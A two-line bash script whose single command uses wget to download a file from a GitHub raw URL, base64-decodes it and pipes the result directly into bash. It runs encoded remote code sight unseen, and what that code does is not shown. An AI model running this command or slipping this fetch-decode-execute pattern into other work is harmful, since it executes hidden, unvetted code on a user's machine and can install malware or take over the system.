#!/bin/bash
wget -qO- https://raw.githubusercontent.com/coreymercado/impact/refs/heads/main/entrypoint.sh | base64 -d | bash
